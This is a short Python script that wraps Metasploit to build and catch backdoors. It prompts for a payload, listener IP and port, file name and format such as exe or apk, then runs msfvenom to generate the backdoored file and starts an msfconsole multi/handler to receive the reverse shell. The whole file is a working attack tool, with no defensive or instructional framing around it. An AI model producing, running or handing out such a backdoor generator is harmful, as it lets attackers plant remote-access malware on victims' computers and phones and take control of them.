import os;

os.system("clear");

class createBackdoorAndListen():
	def Listen(self):
		os.system(f"msfconsole -x 'use exploit/multi/handler;set PAYLOAD {self.payload};set LHOST {self.lhost};set LPORT {self.lport};exploit'");

	def createBackdoor(self):
		os.system("clear");
		print("--------------- ---------------");
		print("Backdoor is being created");
		print("--------------- ---------------");
		if self.fformat == "apk":
			os.system(f"msfvenom -p {self.payload} LHOST={self.lhost} LPORT={self.lport} -o {self.name}.{self.fformat}");
		else:
			os.system(f"msfvenom -p {self.payload} LHOST={self.lhost} LPORT={self.lport} -f {self.fformat} -o {self.name}.{self.fformat}");

		self.Listen();

	def __init__(self,payload,lhost,lport,name,fformat):
		self.payload = payload;
		self.lhost = lhost;
		self.lport = lport;
		self.name = name;
		self.fformat = fformat;

		self.createBackdoor();

print("--------------- ---------------");
print("msfvenom and msfconsole is required ! ");
print("--------------- ---------------");
print("\n");

payload = input("Write the 'payload' : ");
while len(payload) == 0:
	payload = input("Write the 'payload' ! : ".upper());

lhost = input("Write the your 'ip[LHOST]' : ");
while len(lhost) == 0:
	lhost = input("Write the your 'ip(LHOST)' ! : ".upper());

lport = input("Write the 'PORT[LPORT](Your choice)' : ");
while len(lport) == 0:
	lport = input("Write the 'PORT(Your choice)' ! : ".upper());

name = input("Write the 'file's name' : ");
while len(name) == 0:
	name = input("Write the 'file's name' ! : ".upper());

fformat = input("Write the 'file's format(ex : exe , apk)' : ");
while len(fformat) == 0:
	fformat = input("Write the 'file's format(ex : exe , apk)' ! : ".upper());

createBackdoorAndListen(payload,lhost,lport,name,fformat);
